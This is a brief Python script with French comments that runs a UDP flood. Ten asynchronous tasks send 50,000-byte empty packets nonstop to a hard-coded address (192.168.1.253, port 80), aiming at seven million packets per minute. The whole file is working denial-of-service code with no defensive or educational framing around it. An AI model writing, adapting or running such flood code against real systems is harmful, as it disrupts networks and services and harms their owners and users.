import asyncio
import socket

# Adresse IP et port de destination
HOST = '192.168.1.253'
PORT = 80

# Taille des paquets en octets
PACKET_SIZE = 50000

# Fréquence d'envoi en paquets par minute
PACKETS_PER_MINUTE = 7000000

# Calcul de l'intervalle de temps entre chaque envoi
SECONDS_PER_PACKET = 60 / PACKETS_PER_MINUTE

# Fonction pour envoyer les paquets
async def send_packets():
    # Création du socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Boucle d'envoi des paquets
    while True:
        # Génération du paquet de données
        data = bytearray(PACKET_SIZE)

        # Envoi du paquet
        sock.sendto(data, (HOST, PORT))

        # Attente de l'intervalle de temps avant d'envoyer le paquet suivant
        await asyncio.sleep(SECONDS_PER_PACKET)

# Création de 10 tâches asynchrones pour envoyer les paquets
async def main():
    tasks = []
    for i in range(10):
        tasks.append(asyncio.create_task(send_packets()))

    # Attente de la fin des tâches
    await asyncio.gather(*tasks)

# Exécution de la boucle d'événements asyncio
asyncio.run(main())
